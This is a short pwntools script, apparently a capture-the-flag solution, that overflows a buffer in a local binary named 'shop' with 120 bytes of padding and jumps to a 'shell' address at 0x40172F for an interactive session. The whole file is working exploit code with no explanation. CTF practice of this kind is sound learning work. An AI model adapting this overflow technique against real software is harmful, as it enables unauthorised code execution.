from pwn import *
#context.log_level='debug'
io = process('./shop')
padding = 120
shell=0x40172F

payload = b'A'*padding+p64(shell)
io.sendlineafter(b'OS?',payload)
io.interactive()
